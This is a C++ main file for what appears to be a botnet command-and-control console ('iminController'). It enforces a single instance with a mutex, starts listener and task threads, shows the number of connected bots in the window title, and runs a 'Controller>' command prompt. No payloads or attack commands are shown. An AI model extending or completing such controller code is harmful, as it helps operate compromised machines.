#include "Main.h"

int main() {
  if (isDuplicateRunning()) {
    return -1;
  }

  _wsetlocale(LC_ALL, L"korean");

  startAllThread();

  while (true) {
    try {
      std::string CommandBuffer;
      wprintf(L"Controller> ");
      std::getline(std::cin, CommandBuffer);
      if (!CommandBuffer.empty()) {
        CommandHandler *Handler = new CommandHandler(CommandBuffer);

        if (Handler->checkCommand() == 0) {
          int result = Handler->executeCommand();
          if (result == -1) {
            wprintf(L"Wrong Params! (type -> 'help')\n");
          }
        } else {
          wprintf(L"Wrong Command! (type -> 'help')\n");
        }

        delete Handler;
      }
    } catch (int ex) {
      wprintf(L"[ERROR] CODE: %d\n", ex);
    }
  }
}

bool isDuplicateRunning() {
  HANDLE MutexHandle = NULL;

  MutexHandle = CreateMutexW(NULL, FALSE, L"imin2023server");
  if (MutexHandle == NULL) {
    return true;
  }

  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    CloseHandle(MutexHandle);
    return true;
  }

  return false;
}

void titleThread() {
  char Title[128];
  while (TRUE) {
    sprintf(Title, "iminController - [%d] Bots",
            BotHandler::getInstance()->getBotCount());
    SetConsoleTitleA(Title);
    Sleep(1000);
  }
}

void startAllThread() {
  MainHandler::getInstance()->startListenThread();
  TaskHandler::getInstance()->startTaskThread();
  std::thread TitleThread(&titleThread);
  TitleThread.detach();
}